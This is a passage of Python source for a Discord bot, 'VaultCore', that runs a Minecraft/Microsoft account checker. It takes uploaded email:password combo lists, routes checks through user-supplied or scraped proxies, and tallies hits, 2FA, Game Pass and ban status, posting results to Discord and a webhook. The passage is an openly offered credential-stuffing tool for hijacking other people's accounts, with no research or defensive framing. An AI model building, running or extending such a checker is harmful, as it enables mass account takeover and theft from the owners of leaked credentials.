            Checker(combo)
            
            # Update stats from global variables
            self.stats['checked'] = checked
            self.stats['hits'] = hits
            self.stats['bad'] = bad
            self.stats['twofa'] = twofa
            self.stats['sfa'] = sfa
            self.stats['mfa'] = mfa
            self.stats['xgp'] = xgp
            self.stats['xgpu'] = xgpu
            self.stats['other'] = other
            self.stats['vm'] = vm
            self.stats['errors'] = errors
            self.stats['retries'] = retries
            self.stats['unbanned'] = unbanned
            self.stats['banned_count'] = banned_count
            
        except Exception as e:
            self.stats['errors'] += 1

    def get_proxy_type_name(self):
        proxy_names = {
            "'1'": "HTTP",
            "'2'": "SOCKS4", 
            "'3'": "SOCKS5",
            "'4'": "None",
            "'5'": "Auto Scraper"
        }
        return proxy_names.get(self.proxy_type, "Unknown")

    async def status_loop(self):
        """Send status updates every 10 seconds"""
        while self.is_running and self.stats['checked'] < self.stats['total']:
            await self.send_status_update()
            await asyncio.sleep(10)

    async def send_final_summary(self, title="🏁 Checker Completed"):
        """Send final summary when checker completes or is stopped"""
        elapsed = datetime.now() - self.stats['start_time']
        hours, remainder = divmod(elapsed.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        
        embed = discord.Embed(
            title=title,
            color=discord.Color.green() if self.stats['checked'] >= self.stats['total'] else discord.Color.orange(),
            timestamp=datetime.now()
        )
        
        # Add status based on completion
        if self.stats['checked'] < self.stats['total']:
            embed.description = f"**Stopped by user** - {self.stats['checked']}/{self.stats['total']} accounts checked"
        else:
            embed.description = f"**Completed** - All {self.stats['total']} accounts checked"
        
        embed.add_field(
            name="Final Results",
            value=f"✅ **Hits**: `{self.stats['hits']}`\n"
                  f"❌ **Bad**: `{self.stats['bad']}`\n"
                  f"🔐 **2FA**: `{self.stats['twofa']}`\n"
                  f"🎮 **SFA**: `{self.stats['sfa']}`\n"
                  f"🔓 **MFA**: `{self.stats['mfa']}`",
            inline=True
        )
        
        embed.add_field(
            name="Account Types",
            value=f"🎯 **XGP**: `{self.stats['xgp']}`\n"
                  f"⚡ **XGPU**: `{self.stats['xgpu']}`\n"
                  f"📦 **Other**: `{self.stats['other']}`\n"
                  f"📧 **Valid Mail**: `{self.stats['vm']}`",
            inline=True
        )
        
        embed.add_field(
            name="Ban Status",
            value=f"🟢 **Unbanned**: `{self.stats['unbanned']}`\n"
                  f"🔴 **Banned**: `{self.stats['banned_count']}`",
            inline=True
        )
        
        embed.add_field(
            name="Statistics",
            value=f"⏱️ **Duration**: {int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}\n"
                  f"📊 **Total**: `{self.stats['total']}`\n"
                  f"🔍 **Checked**: `{self.stats['checked']}`\n"
                  f"❓ **Errors**: `{self.stats['errors']}`\n"
                  f"🔄 **Retries**: `{self.stats['retries']}`",
            inline=True
        )
        
        embed.set_footer(text=f"Session ID: {self.session_id}")
        
        await self.ctx.send(embed=embed)
        
        # Send to webhook if provided
        if self.webhook_url:
            await self.send_webhook_summary()

    async def send_webhook_summary(self):
        """Send summary to webhook"""
        webhook_data = {
            "username": "VaultCore - Discord Bot",
            "embeds": [{
                "title": "Checker Summary",
                "color": 3066993,
                "fields": [
                    {"name": "Total Accounts", "value": str(self.stats['total']), "inline": True},
                    {"name": "Checked", "value": str(self.stats['checked']), "inline": True},
                    {"name": "Hits", "value": str(self.stats['hits']), "inline": True},
                    {"name": "Bad", "value": str(self.stats['bad']), "inline": True},
                    {"name": "2FA", "value": str(self.stats['twofa']), "inline": True},
                    {"name": "Session ID", "value": self.session_id, "inline": False}
                ],
                "timestamp": datetime.now(timezone.utc).isoformat()
            }]
        }
        
        try:
            requests.post(self.webhook_url, json=webhook_data)
        except Exception as e:
            print(f"Failed to send webhook: {e}")

@bot.event
async def on_ready():
    global synced_commands
    print(f'🤖 {bot.user} has logged in!')
    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=".gg/vaultcore Stocks"
        )
    )
    
    # Sync slash commands only once
    if not synced_commands:
        try:
            synced = await bot.tree.sync()
            synced_commands = True
            print(f"✅ Synced {len(synced)} slash command(s)")
        except Exception as e:
            print(f"❌ Failed to sync slash commands: {e}")

# Slash commands
@bot.tree.command(name="check", description="Start checking Minecraft accounts")
async def check(interaction: discord.Interaction, threads: int, proxy_type: str, webhook_url: str = None):
    """Start a new checker session"""
    await interaction.response.defer()
    
    # Validate threads
    if threads < 1 or threads > 50:
        await interaction.followup.send("❌ Threads must be between 1 and 50")
        return
    
    # Validate proxy type
    proxy_map = {
        '1': "'1'", 'http': "'1'",
        '2': "'2'", 'socks4': "'2'", 
        '3': "'3'", 'socks5': "'3'",
        '4': "'4'", 'none': "'4'",
        '5': "'5'", 'auto': "'5'"
    }
    
    if proxy_type.lower() not in proxy_map:
        await interaction.followup.send("❌ Invalid proxy type. Use: `1` (Http/s), `2` (Socks4), `3` (Socks5), `4` (None), `5` (Auto Scraper)")
        return
    
    mapped_proxy_type = proxy_map[proxy_type.lower()]
    
    # Check if user already has active session
    user_sessions = [s for s in active_checkers.values() if s.ctx.author.id == interaction.user.id and s.is_running]
    if user_sessions:
        await interaction.followup.send("❌ You already have an active checker session. Use `/stop` to stop it first.")
        return
    
    # Send initial setup message
    embed = discord.Embed(
        title="🔧 Checker Setup",
        description="Please upload your files to start checking",
        color=discord.Color.blue()
    )
    embed.add_field(name="Threads", value=str(threads), inline=True)
    embed.add_field(name="Proxy Type", value=proxy_type, inline=True)
    embed.add_field(name="Webhook", value=webhook_url or "Not set", inline=True)
    
    await interaction.followup.send(embed=embed)
    await interaction.followup.send("📁 **Please upload your combos file now** (text file with email:password format):")
    
    def check_attachment(message):
        return (message.author == interaction.user and 
                message.channel == interaction.channel and 
                message.attachments and 
                message.attachments[0].filename.endswith('.txt'))
    
    try:
        attachment_msg = await bot.wait_for('message', check=check_attachment, timeout=60.0)
        combos_attachment = attachment_msg.attachments[0]
        
        # Download the combos file
        combos_content = await combos_attachment.read()
        combos_path = f"temp_combos_{interaction.id}.txt"
        
        with open(combos_path, 'wb') as f:
            f.write(combos_content)
        
        # Verify combos file has content
        with open(combos_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            if len(lines) == 0:
                await interaction.followup.send("❌ The provided combos file is empty.")
                os.remove(combos_path)
                return
        
        # Delete the upload message for cleanliness
        try:
            await attachment_msg.delete()
        except:
            pass
            
        await interaction.followup.send(f"✅ **Combos loaded**: {len(lines)} accounts")
        
    except asyncio.TimeoutError:
        await interaction.followup.send("❌ File upload timed out. Please try the command again.")
        return
    except Exception as e:
        await interaction.followup.send(f"❌ Error reading combos file: {str(e)}")
        return
    
    proxies_path = None
    # Ask for proxies file if proxy type requires it
    if mapped_proxy_type != "'4'" and mapped_proxy_type != "'5'":
        await interaction.followup.send("🌐 **Optional**: Upload your proxies file or type `skip` to continue without proxies:")
        
        def check_proxy_attachment_or_skip(message):
            return (message.author == interaction.user and 
                    message.channel == interaction.channel and 
                    ((message.attachments and message.attachments[0].filename.endswith('.txt')) or
                     message.content.lower().strip() in ['skip', 'no', 'none']))
        
        try:
            proxy_msg = await bot.wait_for('message', check=check_proxy_attachment_or_skip, timeout=30.0)
            
            if proxy_msg.attachments:
                proxies_attachment = proxy_msg.attachments[0]
                
                # Download the proxies file
                proxies_content = await proxies_attachment.read()
                proxies_path = f"temp_proxies_{interaction.id}.txt"
                
                with open(proxies_path, 'wb') as f:
                    f.write(proxies_content)
                
                # Verify proxies file has content
                with open(proxies_path, 'r', encoding='utf-8') as f:
                    proxy_lines = f.readlines()
                    if len(proxy_lines) == 0:
                        await interaction.followup.send("⚠️ The provided proxies file is empty. Continuing without proxies.")
                        proxies_path = None
                    else:
                        await interaction.followup.send(f"✅ **Proxies loaded**: {len(proxy_lines)} proxies")
                
                # Delete the upload message for cleanliness
                try:
                    await proxy_msg.delete()
                except:
                    pass
                    
            else:
                await interaction.followup.send("ℹ️ Continuing without proxies.")
                
        except asyncio.TimeoutError:
            await interaction.followup.send("ℹ️ Proxies upload timed out. Continuing without proxies.")
    
    # Create a context-like object for the session
    class ContextLike:
        def __init__(self, interaction):
            self.author = interaction.user
            self.channel = interaction.channel
            self.send = interaction.followup.send
            self.id = interaction.id
    
    ctx_like = ContextLike(interaction)
    
    # Create checker session
    session = CheckerSession(ctx_like, threads, mapped_proxy_type, combos_path, proxies_path, webhook_url)
    active_checkers[session.session_id] = session
    
    # Start checker in background
    asyncio.create_task(session.run_checker())

from discord import app_commands

@bot.tree.command(name="stop", description="Stop checking sessions")
@app_commands.describe(session_id="ID of the session you want to stop")
async def stop(interaction: discord.Interaction, session_id: str | None = None):
    try:
        await interaction.response.defer(thinking=True)

        stopped_sessions = []

        # --- Stop specific session ---
        if session_id:
            session = active_checkers.get(session_id)

            if not session:
                return await interaction.followup.send("❌ Session not found or already completed.")

            if session.ctx.author.id != interaction.user.id:
                return await interaction.followup.send("❌ You can only stop **your own** sessions.")

            session.is_running = False
            stopped_sessions.append(session)

            await interaction.followup.send(f"🛑 Stopped checker session `{session_id}`")

        # --- Stop all user's sessions ---
        else:
            user_sessions = [
                s for s in active_checkers.values()
                if s.ctx.author.id == interaction.user.id and s.is_running
            ]

            if not user_sessions:
                return await interaction.followup.send("❌ You don't have any active checker sessions.")

            for session in user_sessions:
                session.is_running = False
                stopped_sessions.append(session)

            await interaction.followup.send(f"🛑 Stopped **{len(stopped_sessions)}** checker session(s).")

        # --- Send Summary for each ---
        for session in stopped_sessions:
            try:
                await session.send_final_summary("🛑 Checker Stopped")
            except Exception as e:
                print("Error sending summary:", e)

    except Exception as e:
        # Last safety response (prevents "did not respond")
        try:
            await interaction.followup.send(f"❌ Error occurred: `{e}`")
        except:
            pass



@bot.tree.command(name="status", description="Check session status")
async def status(interaction: discord.Interaction, session_id: str = None):
    """Check status of running sessions"""
    await interaction.response.defer()
    
    if session_id:
        # Specific session status
        if session_id in active_checkers:
            session = active_checkers[session_id]
            if session.ctx.author.id != interaction.user.id:
                await interaction.followup.send("❌ You can only check your own sessions.")
                return
            
            # Create a context-like object for the session
            class ContextLike:
                def __init__(self, interaction):
                    self.author = interaction.user
                    self.channel = interaction.channel
                    self.send = interaction.followup.send
                    self.id = interaction.id
            
            ctx_like = ContextLike(interaction)
            session.ctx = ctx_like
            await session.send_status_update()
        else:
            await interaction.followup.send("❌ Session not found or completed.")
    else:
        # All user sessions
        user_sessions = [s for s in active_checkers.values() 
                        if s.ctx.author.id == interaction.user.id and s.is_running]
        
        if not user_sessions:
            await interaction.followup.send("❌ You don't have any active checker sessions.")
            return
        
        embed = discord.Embed(
            title="📊 Your Active Sessions",
            color=discord.Color.blue()
        )
        
        for session in user_sessions:
            progress = f"{session.stats['checked']}/{session.stats['total']} ({session.stats['checked']/session.stats['total']*100:.1f}%)"
            embed.add_field(
                name=f"Session {session.session_id[:8]}...",
                value=f"Progress: {progress}\nHits: {session.stats['hits']}",
                inline=True
            )
        
        await interaction.followup.send(embed=embed)

@bot.tree.command(name="list", description="List all active sessions")
async def list_sessions(interaction: discord.Interaction):
    """List all active sessions"""
    await interaction.response.defer()
    
    active_sessions = [s for s in active_checkers.values() if s.is_running]
    
    if not active_sessions:
        await interaction.followup.send("❌ No active checker sessions.")
        return
    
    embed = discord.Embed(
        title="📋 All Active Sessions",
        color=discord.Color.purple()
    )
    
    for session in active_sessions:
        user = session.ctx.author
        progress = f"{session.stats['checked']}/{session.stats['total']} ({session.stats['checked']/session.stats['total']*100:.1f}%)"
        embed.add_field(
            name=f"{user.name} - {session.session_id[:8]}...",
            value=f"Progress: {progress}\nHits: {session.stats['hits']}\nThreads: {session.threads}",
            inline=True
        )
    
    await interaction.followup.send(embed=embed)

def setup_checker():
    """Initialize the checker configuration"""
    try:
        loadconfig()
        print("✅ Checker configuration loaded")
    except Exception as e:
        print(f"❌ Error loading config: {e}")

# Bot startup
@bot.event
async def on_connect():
    setup_checker()

def run_discord_bot(token):
    """Start the Discord bot"""
    try:
        bot.run(token)
    except Exception as e:
        print(f"❌ Failed to start bot: {e}")

# Run Discord bot by default
if __name__ == "__main__":
    import sys
    
    # Try to get token from environment variable
    load_dotenv()
    token = os.getenv("BOT_TOKEN")
    
    if not token:
        print("❌ No BOT_TOKEN provided")
        print("💡 Set the BOT_TOKEN environment variable or secret")
        sys.exit(1)
    
    print("🚀 Starting Discord bot...")
    run_discord_bot(token)

    if False:
        # Run original CLI version
        def Main():
            global proxytype, screen
            utils.set_title("VaultCore")
            os.system('clear')
            try:
                loadconfig()
            except:
                print(Fore.RED+"There was an error loading the config. Perhaps you're using an older config? If so please delete the old config and reopen MSMC.")
                input()
                exit()
            print(logo)
            try:
                print(Fore.RED+"(For Best Check Use Only 5-10 Threads)")
                thread = int(input(Fore.LIGHTBLUE_EX+"Threads: "))
            except:
                print(Fore.LIGHTRED_EX+"Must be a number.") 
                time.sleep(2)
                Main()
            print(Fore.LIGHTBLUE_EX+"Proxy Type: [1] Http\s - [2] Socks4 - [3] Socks5 - [4] None - [5] Auto Scraper")
            proxytype = repr(input().strip())
            cleaned = int(proxytype.replace("'", ""))
            if cleaned not in range(1, 6):
                print(Fore.RED+f"Invalid Proxy Type [{cleaned}]")
                time.sleep(2)
                Main()
            print(Fore.LIGHTBLUE_EX+"Screen: [1] CUI - [2] Log")
            screen = repr(input().strip())
            print(Fore.LIGHTBLUE_EX+"Select your combos")
            Load(filedialog.askopenfile().name)
            if proxytype != "'4'" and proxytype != "'5'":
                print(Fore.LIGHTBLUE_EX+"Select your proxies")
                Proxys(filedialog.askopenfile().name)
            if config.get('proxylessban') == False and config.get('hypixelban') is True:
                print(Fore.LIGHTBLUE_EX+"Select your SOCKS5 Ban Checking Proxies.")
                banproxyload(filedialog.askopenfile().name)
            if proxytype =="'5'":
                print(Fore.LIGHTGREEN_EX+"Scraping Proxies Please Wait.")
                threading.Thread(target=get_proxies).start()
                while len(proxylist) == 0: 
                    time.sleep(1)
            if not os.path.exists("results"): os.makedirs("results/")
            if not os.path.exists('results/'+fname): os.makedirs('results/'+fname)
            if screen == "'1'": 
                def cuiscreen():
                    global cpm, cpm1
                    os.system('clear')
                    cmp1 = cpm
                    cpm = 0
                    print(Fore.LIGHTMAGENTA_EX + logo)
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{checked}/{len(Combos)}] Checked")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{hits}] Hits")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{bad}] Bad")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{sfa}] SFA")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{mfa}] MFA")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{twofa}] 2FA")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{xgp}] Xbox Game Pass")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{xgpu}] Xbox Game Pass Ultimate")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{other}] Other")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{vm}] Valid Mail")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{retries}] Retries")
                    print(Fore.LIGHTMAGENTA_EX + f"                                          [{errors}] Errors")
                    utils.set_title(f"Warden Cloud  | Checked: {checked}/{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
                    time.sleep(1)
                    threading.Thread(target=cuiscreen).start()
                cuiscreen()
            elif screen == "'2'": 
                def logscreen():
                    global cpm, cpm1
                    cmp1 = cpm
                    cpm = 0
                    utils.set_title(f"Warden Cloud | Checked: {checked}/{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
                    time.sleep(1)
                    threading.Thread(target=logscreen).start()
                logscreen()
            with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
                futures = [executor.submit(Checker, combo) for combo in Combos]
                concurrent.futures.wait(futures)
            
            def finishedscreen():
                global hits, bad, sfa, mfa, twofa, xgp, xgpu, other, vm, retries, errors, fname, unbanned, banned_count
                print(logo)
                print()
                print(Fore.LIGHTGREEN_EX+"Finished Checking!")
                print()
                print("Hits: "+str(hits))
                print("Bad: "+str(bad))
                print("SFA: "+str(sfa))
                print("MFA: "+str(mfa))
                print("2FA: "+str(twofa))
                print("Xbox Game Pass: "+str(xgp))
                print("Xbox Game Pass Ultimate: "+str(xgpu))
                print("Other: "+str(other))
                print("Valid Mail: "+str(vm))
                print("Unbanned: "+str(unbanned))
                print("Banned: "+str(banned_count))
                print(Fore.LIGHTRED_EX+"Press any key to exit.")
                input()
                sys.exit()
            finishedscreen()
        
        Main()
        input()
